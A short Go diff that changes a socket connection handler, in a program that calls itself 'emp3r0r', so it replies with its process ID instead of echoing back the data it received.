@@ -361,7 +361,7 @@ func socketListen() {
 	}
 }
 
-// handle connections to our socket: echo whatever we get
+// handle connections to our socket: tell them my PID
 func server(c net.Conn) {
 	for {
 		buf := make([]byte, 512)
@@ -372,7 +372,9 @@ func server(c net.Conn) {
 
 		data := buf[0:nr]
 		log.Println("Server got:", string(data))
-		_, err = c.Write(data)
+
+		reply := fmt.Sprintf("emp3r0r running on PID %d", os.Getpid())
+		_, err = c.Write([]byte(reply))
 		if err != nil {
 			log.Printf("Write: %v", err)
 		}
